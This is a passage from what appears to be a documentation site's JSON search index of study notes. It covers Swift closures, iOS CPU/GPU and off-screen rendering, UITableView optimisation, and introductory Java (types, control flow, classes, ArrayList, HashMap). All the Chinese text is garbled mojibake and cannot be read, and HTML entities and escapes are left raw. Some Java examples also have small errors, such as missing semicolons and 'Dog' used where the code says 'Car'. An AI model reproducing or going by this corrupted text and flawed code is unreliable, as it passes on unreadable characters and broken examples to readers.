å‡½æ•°ç±»å‹ï¼š(SomeType) -\u0026gt; SomeType \né—­åŒ… #  Swift ä¸­çš„é—­åŒ…ä¸ C å’Œ Objective-C ä¸­çš„ä»£ç å—ï¼ˆblocksï¼‰ä»¥åŠå…¶ä»–ä¸€äº›ç¼–ç¨‹è¯­è¨€ä¸­çš„ åŒ¿åå‡½æ•°æ¯”è¾ƒç›¸ä¼¼ã€‚\n"},{"id":41,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/","title":"é—®é¢˜è®°å½•","section":"Swift\u0026SDK","content":"é—®é¢˜è®°å½• #   å¯é€‰é¡¹éµç…§ LogicValue åè®®ï¼Œå› æ­¤å¯ä»¥å‡ºç°åœ¨å¸ƒå°”ç¯å¢ƒä¸­ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœå¯é€‰ç±»å‹ T? åŒ…å«ç±»å‹ä¸º T çš„ä»»ä½•å€¼ï¼ˆä¹Ÿå°±æ˜¯è¯´å®ƒçš„å€¼æ˜¯ Optional.Some(T) ï¼‰ï¼Œè¿™ä¸ªå¯é€‰ç±»å‹ç­‰äº trueï¼Œåä¹‹ä¸º falseï¼› æ²¡çœ‹å‡ºæ¥ ! å£°æ˜ä¸ ? å£°æ˜çš„åŒºåˆ«ï¼› åˆ›å»ºæ•°ç»„çš„ä¸¤ç§æ–¹å¼çš„å·®å¼‚ï¼› å­—å…¸çš„åº•å±‚å®ç°ï¼›  "},{"id":42,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/cpugpu/","title":"Cpu\u0026 Gpu","section":"æ€§èƒ½ä¼˜åŒ–","content":" å‚è€ƒï¼š\n https://juejin.im/post/5ace078cf265da23994ee493#heading-2 https://www.zhihu.com/question/29163054 https://www.jianshu.com/p/f62e81b72bba   CPU \u0026amp; GPU #  å›¾å½¢å­¦æ¦‚å¿µ #  å…‰æ …åŒ–ï¼ˆRasterize / Rasteriztionï¼‰ï¼š\n å°±æ˜¯æŠŠçŸ¢é‡å›¾å½¢è½¬åŒ–æˆåƒç´ ç‚¹å„¿çš„è¿‡ç¨‹ã€‚  ç€è‰²å™¨ï¼ˆShaderï¼‰ï¼Œé€šå¸¸ç€è‰²å™¨åˆ†ä¸¤ç§ï¼š\n é¡¶ç‚¹ç€è‰²å™¨ï¼ˆvertex shaderï¼‰ï¼šè¿™ä¸ªæ˜¯å‘Šè¯‰ç”µè„‘å¦‚ä½•æ‰“çº¿ç¨¿çš„â€”â€”å¦‚ä½•å¤„ç†é¡¶ç‚¹ã€æ³•çº¿ç­‰çš„æ•°æ®çš„å°ç¨‹åºã€‚ ç‰‡é¢ç€è‰²å™¨ï¼ˆfragment shaderï¼‰ï¼šè¿™ä¸ªæ˜¯å‘Šè¯‰ç”µè„‘å¦‚ä½•ä¸Šè‰²çš„â€”â€”å¦‚ä½•å¤„ç†å…‰ã€é˜´å½±ã€é®æŒ¡ã€ç¯å¢ƒç­‰ç­‰å¯¹ç‰©ä½“è¡¨é¢çš„å½±å“ï¼Œæœ€ç»ˆç”Ÿæˆä¸€å‰¯å›¾åƒçš„å°ç¨‹åºã€‚  äºŒè€…åŠŸèƒ½ #  CPU çš„èŒèƒ½ï¼š\n åŠ è½½èµ„æºï¼Œå¯¹è±¡åˆ›å»ºï¼Œå¯¹è±¡è°ƒæ•´ï¼Œå¯¹è±¡é”€æ¯ï¼Œå¸ƒå±€è®¡ç®—ï¼ŒAutolayoutï¼Œæ–‡æœ¬è®¡ç®—ï¼Œæ–‡æœ¬æ¸²æŸ“ï¼› å›¾ç‰‡çš„è§£ç ï¼Œ å›¾åƒçš„ç»˜åˆ¶ï¼ˆCore Graphicsï¼‰éƒ½æ˜¯åœ¨CPUä¸Šé¢è¿›è¡Œçš„ã€‚  GPU çš„ç‰¹ç‚¹ï¼š\n GPU æ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºå›¾å½¢é«˜å¹¶å‘è®¡ç®—è€Œé‡èº«å®šåšçš„å¤„ç†å•å…ƒï¼Œæ¯” CPU ä½¿ç”¨æ›´å°‘çš„ç”µæ¥å®Œæˆå·¥ä½œå¹¶ä¸” GPU çš„æµ®ç‚¹è®¡ç®—èƒ½åŠ›è¦è¶…å‡º CPU å¾ˆå¤šã€‚ GPU çš„æ¸²æŸ“æ€§èƒ½è¦æ¯” CPU é«˜æ•ˆå¾ˆå¤šï¼ŒåŒæ—¶å¯¹ç³»ç»Ÿçš„è´Ÿè½½å’Œæ¶ˆè€—ä¹Ÿæ›´ä½ä¸€äº›ï¼Œæ‰€ä»¥åœ¨å¼€å‘ä¸­ï¼Œæˆ‘ä»¬åº”è¯¥å°½é‡è®© CPU è´Ÿè´£ä¸»çº¿ç¨‹çš„ UI è°ƒåŠ¨ï¼ŒæŠŠå›¾å½¢æ˜¾ç¤ºç›¸å…³çš„å·¥ä½œäº¤ç»™ GPU æ¥å¤„ç†ï¼Œå½“æ¶‰åŠåˆ°å…‰æ …åŒ–ç­‰ä¸€äº›å·¥ä½œæ—¶ï¼ŒCPUä¹Ÿä¼šå‚ä¸è¿›æ¥ï¼Œè¿™ç‚¹åœ¨åé¢å†è¯¦ç»†æè¿°ã€‚  GPU çš„æŒ‡è´£ï¼š\n æ¥æ”¶æäº¤çš„çº¹ç†ï¼ˆTextureï¼‰å’Œé¡¶ç‚¹æè¿°ï¼ˆä¸‰è§’å½¢ï¼‰ï¼Œåº”ç”¨å˜æ¢ï¼ˆtransformï¼‰ã€æ··åˆï¼ˆåˆæˆï¼‰å¹¶æ¸²æŸ“ï¼Œç„¶åè¾“å‡ºåˆ°å±å¹•ä¸Šã€‚é€šå¸¸ä½ æ‰€èƒ½çœ‹åˆ°çš„å†…å®¹ï¼Œä¸»è¦ä¹Ÿå°±æ˜¯çº¹ç†ï¼ˆå›¾ç‰‡ï¼‰å’Œå½¢çŠ¶ï¼ˆä¸‰è§’æ¨¡æ‹Ÿçš„çŸ¢é‡å›¾å½¢ï¼‰ä¸¤ç±»ã€‚  ç¦»å±æ¸²æŸ“ #  GPU å±å¹•æ¸²æŸ“æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š\n  On-Screen Rendering å½“å‰å±å¹•æ¸²æŸ“ï¼šæŒ‡çš„æ˜¯ GPU çš„æ¸²æŸ“æ“ä½œæ˜¯åœ¨å½“å‰ç”¨äºæ˜¾ç¤ºçš„å±å¹•ç¼“å†²åŒºä¸­è¿›è¡Œã€‚\n  Off-Screen Rendering æ„ä¸ºç¦»å±æ¸²æŸ“ï¼šæŒ‡çš„æ˜¯ GPU åœ¨å½“å‰å±å¹•ç¼“å†²åŒºä»¥å¤–æ–°å¼€è¾Ÿä¸€ä¸ªç¼“å†²åŒºè¿›è¡Œæ¸²æŸ“æ“ä½œã€‚\n  **ç‰¹æ®Šçš„ç¦»å±æ¸²æŸ“ï¼š**å¦‚æœå°†ä¸åœ¨GPUçš„å½“å‰å±å¹•ç¼“å†²åŒºä¸­è¿›è¡Œçš„æ¸²æŸ“éƒ½ç§°ä¸ºç¦»å±æ¸²æŸ“ï¼Œé‚£ä¹ˆå°±è¿˜æœ‰å¦ä¸€ç§ç‰¹æ®Šçš„â€œç¦»å±æ¸²æŸ“â€æ–¹å¼ï¼šCPU æ¸²æŸ“ã€‚\n å¦‚æœæˆ‘ä»¬é‡å†™äº† drawRect æ–¹æ³•ï¼Œå¹¶ä¸”ä½¿ç”¨ä»»ä½• Core Graphics çš„æŠ€æœ¯è¿›è¡Œäº†ç»˜åˆ¶æ“ä½œï¼Œå°±æ¶‰åŠåˆ°äº†CPUæ¸²æŸ“ã€‚æ•´ä¸ªæ¸²æŸ“è¿‡ç¨‹ç”± CPU åœ¨ App å†…åŒæ­¥åœ°å®Œæˆï¼Œæ¸²æŸ“å¾—åˆ°çš„ bitmap æœ€åå†äº¤ç”± GPU ç”¨äºæ˜¾ç¤ºã€‚  PostScriptï¼šCore Graphic é€šå¸¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå¼‚æ­¥ç»˜åˆ¶ï¼Œæ˜¾ç¤ºçš„æ—¶å€™å†æ”¾å›ä¸»çº¿ç¨‹ï¼Œä¸€ä¸ªç®€å•çš„å¼‚æ­¥ç»˜åˆ¶è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\n(void)display { \tdispatch_async(backgroundQueue, ^{  CGContextRef ctx = CGBitmapContextCreate(...); // draw in context...  CGImageRef img = CGBitmapContextCreateImage(ctx);  CFRelease(ctx);  dispatch_async(mainQueue, ^{  layer.contents = img;  });  }); } åœ¨ iOS ä¸­ï¼Œè®¾ç½®äº†ä»¥ä¸‹çš„å±æ€§ï¼Œä¼šè§¦å‘ç¦»å±æ¸²æŸ“ï¼š\n  å…‰æ …åŒ–ï¼šlayer.shouldRasterize = YESï¼›\n  é®ç½©ï¼šlayer.maskï¼›\n  ä¸é€æ˜ï¼šlayer.allowsGroupOpacity = YES å¹¶ä¸” layer.opacity \u0026lt; 1.0ï¼›\n  é˜´å½±ï¼šlayer.shadow...ï¼ˆæ‰€æœ‰ä»¥ shadow å‰ç¼€å¼€å¤´çš„å±æ€§ï¼‰ï¼Œä½¿ç”¨ shadowPath ä»£æ›¿ï¼š\n// ä½¿ç”¨ shadow å¼€å¤´çš„å±æ€§è¿›è¡Œè®¾ç½® {  CALayer *imgLayer = cell.imageView.layer;  imgLayer.shadowColor = [UIColor blackColor].CGColor;  imgLayer.shadowOpacity = 1.0;  imgLayer.shadowRadius = 2.0;  imgLayer.shadowOffset = CGSizeMake(1.0, 1.0); }  // ä½¿ç”¨ shadowPath è¿›è¡Œç»˜åˆ¶ {  CALayer *imgLayer = cell.imageView.layer;  imgLayer.shadowPath = CGPathCreateWithRect(imgRect, NULL); }   edge antialiasingï¼ˆæŠ—é”¯é½¿ï¼‰ã€group opacityï¼ˆä¸é€æ˜ï¼‰ã€å¤æ‚å½¢çŠ¶è®¾ç½®åœ†è§’ç­‰\n  ä¸ºä»€ä¹ˆä¼šä½¿ç”¨ç¦»å±æ¸²æŸ“ï¼Ÿ\n å½“ä½¿ç”¨åœ†è§’ï¼Œé˜´å½±ï¼Œé®ç½©çš„æ—¶å€™ï¼Œå›¾å±‚å±æ€§çš„æ··åˆä½“è¢«æŒ‡å®šä¸ºâ€åœ¨æœªé¢„åˆæˆä¹‹å‰ï¼Œä¸èƒ½ç›´æ¥åœ¨å±å¹•ä¸­ç»˜åˆ¶â€œï¼Œæ‰€ä»¥å°±éœ€è¦å±å¹•å¤–æ¸²æŸ“è¢«å”¤èµ·ã€‚ å±å¹•å¤–æ¸²æŸ“å¹¶ä¸æ„å‘³ç€è½¯ä»¶ç»˜åˆ¶ï¼Œä½†æ˜¯å®ƒæ„å‘³ç€å›¾å±‚å¿…é¡»åœ¨è¢«æ˜¾ç¤ºä¹‹å‰åœ¨ä¸€ä¸ªå±å¹•å¤–ä¸Šä¸‹æ–‡ä¸­è¢«æ¸²æŸ“ï¼ˆä¸è®º CPU è¿˜æ˜¯ GPUï¼‰ã€‚ æ‰€ä»¥å½“ä½¿ç”¨ç¦»å±æ¸²æŸ“çš„æ—¶å€™ä¼šå¾ˆå®¹æ˜“é€ æˆæ€§èƒ½æ¶ˆè€—ï¼Œå› ä¸ºåœ¨ OPENGL é‡Œç¦»å±æ¸²æŸ“ä¼šå•ç‹¬åœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªå±å¹•å¤–ç¼“å†²åŒºå¹¶è¿›è¡Œæ¸²æŸ“ï¼Œè€Œå±å¹•å¤–ç¼“å†²åŒºè·Ÿå½“å‰å±å¹•ç¼“å†²åŒºä¸Šä¸‹æ–‡åˆ‡æ¢æ˜¯å¾ˆè€—æ€§èƒ½çš„ã€‚  "},{"id":43,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/","title":"ä¼˜åŒ–æ–¹æ¡ˆ","section":"æ€§èƒ½ä¼˜åŒ–","content":" å‚è€ƒï¼š\n https://github.com/ming1016/study/wiki/iOSæ€§èƒ½ä¼˜åŒ– https://juejin.im/post/5ace078cf265da23994ee493#heading-7   ä¼˜åŒ–æ–¹æ¡ˆ #  UITableView #  ç¼“å­˜æ± å­˜å‚¨ cellï¼Œå¤ç”¨ cellï¼š\n åœ¨ cellForRowAtIndexPath: å›è°ƒçš„æ—¶å€™åªåˆ›å»ºå®ä¾‹ï¼Œå¿«é€Ÿè¿”å› cellï¼Œä¸ç»‘å®šæ•°æ®ã€‚ åœ¨ willDisplayCell: forRowAtIndexPath: çš„æ—¶å€™é€šè¿‡ dequeueReusableCellWithIdentifier: æ–¹æ³•å–ç¼“å­˜çš„ cellï¼Œé€šè¿‡ initWithStyle:reuseIdentifier: ç»‘å®šæ•°æ®ï¼ˆèµ‹å€¼ï¼‰ã€‚  ç¼“å­˜é«˜åº¦ï¼š\n åœ¨ tableView æ»‘åŠ¨æ—¶ï¼Œä¼šä¸æ–­è°ƒç”¨ heightForRowAtIndexPath:ï¼Œå½“ cell é«˜åº¦éœ€è¦è‡ªé€‚åº”æ—¶ï¼Œæ¯æ¬¡å›è°ƒéƒ½è¦è®¡ç®—é«˜åº¦ï¼Œä¼šå¯¼è‡´ UI å¡é¡¿ã€‚ä¸ºäº†é¿å…é‡å¤æ— æ„ä¹‰çš„è®¡ç®—ï¼Œéœ€è¦ç¼“å­˜é«˜åº¦ã€‚ é€šè¿‡ Dictionary æˆ– NSCache çš„æ–¹å¼è¿›è¡Œç¼“å­˜ï¼› å¼€æºé¡¹ç›®ï¼šFDTemplateLayoutCell  è§†å›¾å±‚çº§ä¼˜åŒ– #  ä¸è¦åŠ¨æ€åˆ›å»ºè§†å›¾ï¼š\n åœ¨å†…å­˜å¯æ§çš„å‰æä¸‹ï¼Œç¼“å­˜ subviewï¼›å–„ç”¨hiddenã€‚  å‡å°‘è§†å›¾å±‚çº§ï¼š\n å‡å°‘ subview çš„æ•°é‡ï¼Œä½¿ç”¨layer ä¸­çš„ drawrect ç»˜åˆ¶ï¼Œè¿™æ ·å¯ä»¥åˆ©ç”¨ GPU ç¦»å±æ¸²æŸ“ï¼› å°‘ç”¨ clearColorï¼ŒmaskToBoundsï¼Œé˜´å½±æ•ˆæœç­‰ï¼Œå¯ä»¥é¿å… GPU ç¦»å±æ¸²æŸ“ï¼›  å›¾ç‰‡ä¼˜åŒ–ï¼š\n ä¼˜åŒ–å›¾ç‰‡å¤§å°ï¼Œå°½é‡ä¸è¦åŠ¨æ€ç¼©æ”¾(contentMode)ï¼Œé¿å…å›¾å½¢ç‰¹æ•ˆï¼Œå›¾ç‰‡ç¼©æ”¾é¢œè‰²æ¸å˜ç­‰ï¼› å°½å¯èƒ½å°†å¤šå¼ å›¾ç‰‡åˆæˆä¸ºä¸€å¼ è¿›è¡Œæ˜¾ç¤ºï¼› ä¸è¦ç”¨JPEGçš„å›¾ç‰‡ï¼Œåº”å½“ä½¿ç”¨PNGå›¾ç‰‡ã€‚ å­çº¿ç¨‹é¢„è§£ç ï¼ˆDecodeï¼‰ï¼Œä¸»çº¿ç¨‹ç›´æ¥æ¸²æŸ“ã€‚å› ä¸ºå½“ image æ²¡æœ‰ Decodeï¼Œç›´æ¥èµ‹å€¼ç»™ imageView ä¼šè¿›è¡Œä¸€ä¸ª Decode æ“ä½œä»è€Œé˜»å¡ä¸»çº¿ç¨‹ã€‚  è®¾ç½®ä¸é€æ˜ ä¸è¦é˜»å¡ä¸»çº¿ç¨‹ï¼Œå°†å¤„ç†æ”¾åˆ°å­çº¿ç¨‹ä¸­å»å¤„ç†è®¾ç½®æœ€å¤§çº¿ç¨‹æ•°ä¸º 2ï¼Œåˆ©ç”¨ NSOperationQueue çš„maxConcurrentOperationCount ä¸º 2ï¼›  "},{"id":44,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/1.introduction/","title":"1. Introduction","section":"codeacademy","content":"Introduction #  Here is a Hello World code:\n// FirstClass.java public class FirstClass {  public static void main(String[] args) {  System.out.println(\u0026#34;shesl-meow\u0026#34;);  } } Compile with the following command:\n$ javac FirstClass.java # Generate FirstClass.class in the same folder Run the java program with the following command:\n$ java FirstClass Data Type #   The first data type we will use is int.  int is short for integer, which are all positive and negative numbers, including zero. This number could represent the number of visits a website has received or the number of programming languages you know. The int data type only allows values between -2,147,483,648 and 2,147,483,647.   The next data type we will use is the boolean.  A boolean is a data type that can only be either true or false.   The char data type is used to represent single characters. That includes the keys on a keyboard that are used to produce text.  char is short for character and can represent a single character. All char values must be enclosed in single quotes, like this: 'G'.    Variable #  We can assign a variable to a specified data type, like this:\nint myLuckyNumber = 7; The variable myLuckyNumber now stores the value 7 as an int type.\nA semicolon ; is also used to end all Java single code statements. We will cover statements that should not end in a semicolon later in this course.\nWhiteSpace #  Whitespace is one or more characters (such as a space, tab, enter, or return) that do not produce a visible mark or text. Whitespace is often used to make code visually presentable.\nJava will ignore whitespace in code, but it is important to know how to use whitespace to structure code well. If you use whitespace correctly, code will be easier for you and other programmers to read and understand.\nComments #  A comment is text you want Java to ignore. Comments allow you to describe code or keep notes.\nBy using comments in the Java code, you may help yourself and even other programmers understand the purpose of code that a comment refers to.\nIn Java, there are two styles of comments: single line commentsand multi-line comments.\n  Single line comments are one line comments that begin with two forward slashes:\n// I\u0026#39;m a single line comment!   Multi-line comments are generally longer comments that can span multiple lines. They begin with /* and end with */ . Here\u0026rsquo;s an example:\n/* Hello, Java! */   Math Operation #  +, -, *, /, %\nRelation Operation #  Relational operators will always return a boolean value of trueor false.\nHere are a few relational operators:\n \u0026lt; : less than. \u0026lt;=: less than or equal to. \u0026gt;: greater than. \u0026gt;=: greater than or equal to.  Equality Operator #  The equality operators are:\n ==: equal to. !=: not equal to.  Equality operators do not require that operands share the same ordering. For example, you can test equality across boolean, char, or int data types. The example below combines assigning variables and using an equality operator:\nchar myChar = \u0026#39;A\u0026#39;; int myInt = -2; System.out.println(myChar == myInt); The example above will print out false because the value of myChar ('A') is not the same value as myInt ('-2').\n"},{"id":45,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/2.conditionalandcontrolflow/","title":"2. Conditional and Control Flow","section":"codeacademy","content":"Conditional And Control Flow #  Boolean operators #    There are three Boolean operators that we will explore. Let\u0026rsquo;s start with the first one: and.\n The and operator is represented in Java by \u0026amp;\u0026amp;. It returns a boolean value of true only when the expressions on both sides of \u0026amp;\u0026amp; are true.    Great! The second Boolean operator that we will explore is called or.\n The or operator is represented in Java by ||. It returns a Boolean value of true when at least one expression on either side of || is true.    The final Boolean operator we will explore is called not.\n The not operator is represented in Java by !. It will return the opposite of the expression immediately after it. It will return false if the expression is true, and true if the expression is false.    The precedence of each Boolean operator is as follows:\n ! is evaluated first \u0026amp;\u0026amp; is evaluated second || is evaluated third  If Statement #  Let\u0026rsquo;s get familiar with how relational, equality, and Boolean operators can be used to control the flow of our code.\nWe\u0026rsquo;ll start by exploring the ifstatement.\n In Java, the keyword if is the first part of a conditional expression. It is followed by a Boolean expression and then a block of code. If the Boolean expression evaluates to true, the block of code that follows will be run.  Here\u0026rsquo;s an example of the ifstatement used with a conditional expression:\nif (9 \u0026gt; 2) {  System.out.println(\u0026#34;Control flow rocks!\u0026#34;); } If-Else Statement #  Sometimes we execute one block of code when the Boolean expression after the ifkeyword is true. Other times we may want to execute a different block of code when the Boolean expression is false.\nWe could write a second ifstatement with a Boolean expression that is opposite the first, but Java provides a shortcut called the if/elseconditional.\n The if/else conditional will run the block of code associated with the ifstatement if its Boolean expression evaluates to true. Otherwise, if the Boolean expression evaluates to false, it will run the block of code after the elsekeyword.  Here\u0026rsquo;s an example of if/elsesyntax:\nif (1 \u0026lt; 3 \u0026amp;\u0026amp; 5 \u0026lt; 4) {  System.out.println(\u0026#34;I defy the Boolean laws!\u0026#34;) } else {  System.out.println(\u0026#34;You can thank George Boole!\u0026#34;); } If-ElseIf-Else Statement #  Good work! In some cases, we need to execute a separate block of code depending on different Boolean expressions. For that case, we can use the if/else if/else statement in Java.\n If the Boolean expression after the if statement evaluates to true, it will run the code block that directly follows. Otherwise, if the Boolean expression after the else if statement evaluates to true, the code block that directly follow will run. Finally, if all previous Boolean expressions evaluate to false, the code within the else block will run.  Here\u0026rsquo;s an example of control flow with the if/else if/elsestatement:\nint shoeSize = 10;  if (shoeSize \u0026gt; 12) {  System.out.println(\u0026#34;Sorry, your shoe size is currently not in stock.\u0026#34;); } else if (shoeSize \u0026gt;= 6) {  System.out.println(\u0026#34;Your shoe size is in stock!\u0026#34;); } else {  System.out.println(\u0026#34;Sorry, this store does not carry shoes smaller than a size 6.\u0026#34;); } Ternary Conditional #  if/else statements can become lengthy even when you simply want to return a value depending on a Boolean expression. Fortunately, Java provides a shortcut that allows you to write if/elsestatements in a single line of code. It is called the ternary conditional statement.\nThe term ternary comes from a Latin word that means \u0026ldquo;composed of three parts\u0026rdquo;.\nThese three parts are:\n A Boolean expression A single statement that gets executed if the Boolean expression is true A single statement that gets executed if the Boolean expression is false  Here is an example of a ternary conditional statement:\nint pointsScored = 21;  char gameResult = (pointsScored \u0026gt; 20) ? \u0026#39;W\u0026#39; : \u0026#39;L\u0026#39;; System.out.println(gameResult); Switch Statement #  The conditional statements that we have covered so far require Boolean expressions to determine which code block to run. Java also provides a way to execute code blocks based on whether a block is equal to a specific value. For those specific cases, we can use the switchstatement, which helps keep code organized and less wordy.\nThe switch statement is used as follows:\nint restaurantRating = 3;  switch (restaurantRating) {   case 1: System.out.println(\u0026#34;This restaurant is not my favorite.\u0026#34;);  break;   case 2: System.out.println(\u0026#34;This restaurant is good.\u0026#34;);  break;   case 3: System.out.println(\u0026#34;This restaurant is fantastic!\u0026#34;);  break;   default: System.out.println(\u0026#34;I\u0026#39;ve never dined at this restaurant.\u0026#34;);  break; } "},{"id":46,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/3.objectoriented/","title":"3. Object Oriented","section":"codeacademy","content":"Object Oriented #  Java is an object-oriented programming (OOP) language, which means that we can design classes, objects, and methods that can perform certain actions. These behaviors are important in the construction of larger, more powerful Java programs.\nClasses #  Syntax #  One fundamental concept of object-oriented programming in Java is the class.\nA class is a set of instructions that describe how a data structure should behave.\nJava provides us with its own set of pre-defined classes, but we are also free to create our own custom classes.\nClasses in Java are created as follows:\n//Create a custom Car class  class Car {  } Constructors #  Let\u0026rsquo;s start by creating the starting state of our class. We can do this by adding a class constructor to it.\n A class constructor will allow us to create Doginstances. With a class constructor, we can set some information about the Dog. If we do not create a class constructor, Java provides one that does not allow you to set initial information.  The code below demonstrates how a class constructor is created:\nclass Car {   //The class constructor for the Car class  public Car() {   } } Instance Variables #  When we create a new class, we probably have specific details that we want the class to include. We save those specific details into instance variables.\nHere is an instance variable in the Car class that describes a detail that we might want to associate with a car:\nclass Car {   //Using instance variables to model our Car class after a real-life car  int modelYear;   public Car() {   } } Constructor Parameters #  Perfect! By adding a class constructor and creating instance variables, we will soon be able to use the Dog class. However, the class constructor Dog is still empty. Let\u0026rsquo;s modify this by adding parameters to the Dogconstructor.\nYou can think of parameters like options at an ice cream store. You can choose to order a traditional ice cream cone, but other times you may want to specify the size of the cone or the flavor of the ice cream.\nFor the Dog class, we can specify the initial dog age by adding parameters to the class constructor.\n Parameters allow data types to be created with specified attributes.  Let\u0026rsquo;s add parameters to our Car class constructor:\nclass Car {   //Use instance variables to model our Car class after a real-life car  int modelYear;   public Car(int year) {   modelYear = year;  } } The Main Method #  This is Java\u0026rsquo;s built-in main method. We will learn more about methods and keywords around the main method later on, but first let\u0026rsquo;s understand what the purpose of main is.\n When Java runs your program, the code inside of the main method is executed.  For now, you can ignore the keywords in the main method that we have not yet covered. You will learn about them later in the course.\nObjects #  To use the Dog class, we must create an instance of the Dog class. An instance of a class is known as an object in Java.\nThe example below demonstrates how to create a Car object:\nclass Car {   int modelYear;   public Car(int year) {   modelYear = year;   }   public static void main(String[] args){   Car myFastCar = new Car(2007);   } } In the example above, we create a Car object named myFastCar. When creating myFastCar, we used the class constructor and specified a value for the required int parameter year.\n2007 is the model year of myFastCar. Note that we declared the new object inside the main method.\nMethod #  A method is a pre-defined set of instructions. Methods are declared within a class. Java provides some pre-defined methods available to all classes, but we can create our own as well.\nLet\u0026rsquo;s create a new method:\nclass Car {   int modelYear;   public Car(int year) {   modelYear = year;   }   //Our new method to help us get \u0026#34;started\u0026#34;  public void startEngine() {   System.out.println(\u0026#34;Vroom!\u0026#34;);   }   public static void main(String[] args){   Car myFastCar = new Car(2007);   } } Here is an example of calling a method on an object using the Car class:\nclass Car {   int modelYear;   public Car(int year) {   modelYear = year;   }   public void startEngine() {   System.out.println(\u0026#34;Vroom!\u0026#34;);   }   public static void main(String[] args){   Car myFastCar = new Car(2007);  myFastCar.startEngine();  } } Inheritance #  One of the object-oriented programming concepts that allows us to reuse and maintain code more efficiently is called inheritance. It is used to share or inherit behavior from another class. Let\u0026rsquo;s look at an example:\nclass Car extends Vehicle {   int modelYear;   public Car(int year) {   modelYear = year;   }   //Other methods omitted for brevity...   public static void main(String[] args){   Car myFastCar = new Car(2007)  myFastCar.checkBatteryStatus();   } }  class Vehicle {   public void checkBatteryStatus() {   System.out.println(\u0026#34;The battery is fully charged and ready to go!\u0026#34;);   } } "},{"id":47,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/4.datastructures/","title":"4. Data Structures","section":"codeacademy","content":"Data Structures #  For Loop #  The for loop repeatedly runs a block of code until a specified condition is met.\nThe example below shows how a for loop is used:\nfor (int counter = 0; counter \u0026lt; 5; counter++) {   System.out.println(\u0026#34;The counter value is: \u0026#34; + counter);  } The statements within the parentheses of for loop compose the following parts:\n  Initialization: the int variable named counter is initialized to the value of 0before the loop is run.\n  Test condition: the Boolean expression counter \u0026lt; 5 is a conditional statement that is evaluated before the code inside the control statement is run every loop. If the expression evaluates to true, the code in the block will run. Otherwise, if the expression evaluates to false, the for loop will stop running.\n  Increment: Each time the loop completes, the increment statement is run. The statement counter++ increases the value of counter by 1 after each loop.\n  ArrayList #  The ArrayList stores a list of data of a specified type. Let\u0026rsquo;s go through an example of how to create, or declare, an ArrayList of type Integer.\nimport java.util.ArrayList;  ArrayList\u0026lt;Integer\u0026gt; quizGrades = new ArrayList\u0026lt;Integer\u0026gt;(); ArrayList is a pre-defined Java class. To use it, we must first create an ArrayList object.\nIn the example above, we create an ArrayList object called quizGrades that will store data types belonging to the \u0026lt;Integer\u0026gt; class (whole numbers).\nManipulation #  Let\u0026rsquo;s add some values of type Integer to the ArrayList, one by one, like this:\nArrayList\u0026lt;Integer\u0026gt; quizGrades = new ArrayList\u0026lt;Integer\u0026gt;(); quizGrades.add(95); quizGrades.add(87); quizGrades.add(83); In the example above, we call the addmethod on quizGrades. The add method adds integers to the ArrayList. The values 95, 87, and 83 are added to the list.\nAccess #  Here is an example of accessing the element in the first position of the list:\nArrayList\u0026lt;Integer\u0026gt; quizGrades = new ArrayList\u0026lt;Integer\u0026gt;(); quizGrades.add(95); quizGrades.add(87); quizGrades.add(73);  System.out.println( quizGrades.get(0) ); The example above will print out the grade value of 95.\nInsertion #  To insert new elements into an ArrayList, we can use a slightly different version of the addmethod that you previously used:\nArrayList\u0026lt;Integer\u0026gt; quizGrades = new ArrayList\u0026lt;Integer\u0026gt;(); quizGrades.add(95); quizGrades.add(87); quizGrades.add(73);  quizGrades.add(0, 100); System.out.println( quizGrades.get(0) ); Iterating over #  Earlier in this lesson, we learned about the for loop. Since we\u0026rsquo;ve also learned how to retrieve the value at a specific index of an ArrayList, we can now access each of the elements.\nfor (int i = 0; i \u0026lt; quizGrades.size(); i++) {   System.out.println( quizGrades.get(i) );  } For Each Loop #  Here is an example of the concise for each loop:\nfor (Integer grade : quizGrades){  System.out.println(grade); } HashMap #  Another useful built-in data structure in Java is the HashMap.\nAlthough the name of the data structure might not make sense to you immediately, think of it as a real-life dictionary. A dictionary contains a set of words and a definition for each word. A HashMap contains a set of keysand a value for each key.\nIf we look up a word in a dictionary, we can get the definition. If you provide a HashMap with a key that exists, you can retrieve the value associated with the key.\nDeclaring a HashMap is shown in the following example:\nimport java.util.HashMap;  HashMap\u0026lt;String, Integer\u0026gt; myFriends = new HashMap\u0026lt;String, Integer\u0026gt;(); Manipulation #  Add keys and values to a HashMap:\nHashMap\u0026lt;String, Integer\u0026gt; myFriends = new HashMap\u0026lt;String, Integer\u0026gt;();  myFriends.put(\u0026#34;Mark\u0026#34;, 24); myFriends.put(\u0026#34;Cassandra\u0026#34;, 25); myFriends.put(\u0026#34;Zenas\u0026#34;, 21); Access #  To access data in an ArrayList, we specified the index. In order to access a value in a HashMap, we specify the key:\nHashMap\u0026lt;String, Integer\u0026gt; myFriends = new HashMap\u0026lt;String, Integer\u0026gt;();  myFriends.put(\u0026#34;Mark\u0026#34;, 24); myFriends.put(\u0026#34;Cassandra\u0026#34;, 25); myFriends.put(\u0026#34;Zenas\u0026#34;, 21);  System.out.println( 